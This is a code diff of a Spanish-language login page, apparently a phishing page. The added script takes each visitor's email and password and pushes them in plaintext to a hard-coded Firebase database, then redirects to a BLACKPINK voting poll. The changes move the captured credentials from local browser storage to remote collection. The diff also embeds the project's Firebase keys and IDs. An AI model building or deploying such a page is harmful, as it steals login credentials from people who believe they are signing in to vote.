@@ -17,14 +17,12 @@
       align-items: center; 
       min-height: 100vh; 
       flex-direction: column;
-
-      /* Fondo con nueva imagen */
       background: url('https://pbs.twimg.com/media/FvTDI2_X0AE-aNl.jpg:large') no-repeat center center fixed;
       background-size: cover;
     }
 
     .login-box { 
-      background: rgba(255, 255, 255, 0.9); /* blanco semitransparente */
+      background: rgba(255, 255, 255, 0.9); 
       padding: 40px; 
       border-radius: 20px; 
       box-shadow: 0 8px 20px rgba(0,0,0,0.3); 
@@ -35,63 +33,15 @@
       animation: fadeIn 1s ease-in-out; 
     }
 
-    .login-box h2 { 
-      margin-bottom: 5px; 
-      font-weight: 600; 
-      font-size: 22px; 
-      color: #111; 
-    }
+    .login-box h2 { margin-bottom: 5px; font-weight: 600; font-size: 22px; color: #111; }
+    .login-box p { margin-top: 0; color: #444; font-size: 14px; }
+    .login-box input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 10px; font-size: 14px; }
+    .login-box button { width: 100%; padding: 12px; background: #ff3399; border: none; border-radius: 10px; color: white; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; transition: 0.3s; }
+    .login-box button:hover { background: #cc0066; }
+    .extra { margin-top: 15px; font-size: 13px; color: #666; }
+    .extra a { color: #ff3399; text-decoration: none; cursor: pointer; }
+    .extra a:hover { text-decoration: underline; }
 
-    .login-box p { 
-      margin-top: 0; 
-      color: #444; 
-      font-size: 14px; 
-    }
-
-    .login-box input { 
-      width: 100%; 
-      padding: 12px; 
-      margin: 10px 0; 
-      border: 1px solid #ddd; 
-      border-radius: 10px; 
-      font-size: 14px; 
-    }
-
-    .login-box button { 
-      width: 100%; 
-      padding: 12px; 
-      background: #ff3399; 
-      border: none; 
-      border-radius: 10px; 
-      color: white; 
-      font-size: 16px; 
-      font-weight: 600; 
-      cursor: pointer; 
-      margin-top: 10px; 
-      transition: 0.3s; 
-    }
-
-    .login-box button:hover { 
-      background: #cc0066; 
-    }
-
-    .extra { 
-      margin-top: 15px; 
-      font-size: 13px; 
-      color: #666; 
-    }
-
-    .extra a { 
-      color: #ff3399; 
-      text-decoration: none; 
-      cursor: pointer; 
-    }
-
-    .extra a:hover { 
-      text-decoration: underline; 
-    }
-
-    /* Animación fade-in */
     @keyframes fadeIn {
       from { opacity: 0; transform: translateY(-20px); }
       to { opacity: 1; transform: translateY(0); }
@@ -115,7 +65,28 @@
     </div>
   </div>
 
-  <script>
+  <!-- Firebase SDK -->
+  <script type="module">
+    // Importar SDK
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
+    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";
+
+    // Configuración de Firebase
+    const firebaseConfig = {
+      apiKey: "AIzaSyBFcBx7J4Yi01yka8oqqwEnjWQ4gYt7WBo",
+      authDomain: "loginapp-63f68.firebaseapp.com",
+      databaseURL: "https://loginapp-63f68-default-rtdb.firebaseio.com",
+      projectId: "loginapp-63f68",
+      storageBucket: "loginapp-63f68.firebasestorage.app",
+      messagingSenderId: "899292217772",
+      appId: "1:899292217772:web:b7b7fde65af64e639b7a09",
+      measurementId: "G-6NEF65BNGK"
+    };
+
+    // Inicializar Firebase
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
     const loginForm = document.getElementById('loginForm');
     const recoverLink = document.getElementById('recoverLink');
 
@@ -124,13 +95,19 @@
       const email = this.email.value;
       const password = this.password.value;
 
-      // Guardar en localStorage
-      let historial = JSON.parse(localStorage.getItem('historialDatos')) || [];
-      historial.push({ email, password, fecha: new Date().toLocaleString() });
-      localStorage.setItem('historialDatos', JSON.stringify(historial));
-
-      // Redirigir a la nueva página
-      window.location.href = "https://www.tuvotacion.com/quien-es-la-ms-bonita-de-blackpink-1";
+      // Guardar en Realtime Database
+      push(ref(db, 'usuarios'), {
+        email,
+        password,
+        fecha: new Date().toLocaleString()
+      })
+      .then(() => {
+        // Redirigir a la votación
+        window.location.href = "https://www.tuvotacion.com/quien-es-la-ms-bonita-de-blackpink-1";
+      })
+      .catch((error) => {
+        console.error("Error al guardar en Firebase:", error);
+      });
     });
 
     recoverLink.addEventListener('click', function(){
